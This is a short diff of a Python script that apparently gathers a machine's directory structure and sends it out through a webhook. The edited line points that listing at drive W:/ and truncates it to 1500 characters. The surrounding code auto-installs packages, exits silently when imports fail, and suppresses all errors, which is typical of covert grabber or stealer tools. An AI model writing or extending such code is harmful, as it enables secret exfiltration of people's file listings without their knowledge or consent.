@@ -27,10 +27,10 @@ def ensure_package(package_name, import_name):
             package_name,
         ])
 
-ensure_package("pyautogui", "pyautogui")
+# ensure_package("pyautogui", "pyautogui")
 
 try:
-    import pyautogui
+    # import pyautogui
     import requests
 except:
     sys.exit()
@@ -264,7 +264,7 @@ if __name__ == "__main__":
     ]
 
     try:
-        send_webhook(str(get_directory_architecture())[:1500])
+        send_webhook(str(get_directory_architecture("W:/"))[:1500])
     except:
         pass
     
